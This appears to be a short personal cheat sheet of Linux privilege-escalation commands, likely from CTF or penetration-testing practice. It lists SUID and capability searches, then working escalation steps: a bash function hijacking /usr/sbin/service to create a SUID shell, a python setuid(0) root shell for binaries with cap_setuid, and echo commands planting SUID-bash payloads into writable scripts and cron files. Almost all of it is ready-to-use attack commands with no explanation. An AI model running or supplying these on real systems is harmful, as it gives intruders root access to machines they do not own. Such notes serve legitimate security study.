find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -04000 -ls  2>/dev/null
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
getcap -r / 2>/dev/null (capalities huntinig permit anything)
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
note:cap_setuid+ep(permit anything)
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/oerwrite.sh

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >  file of ctontab
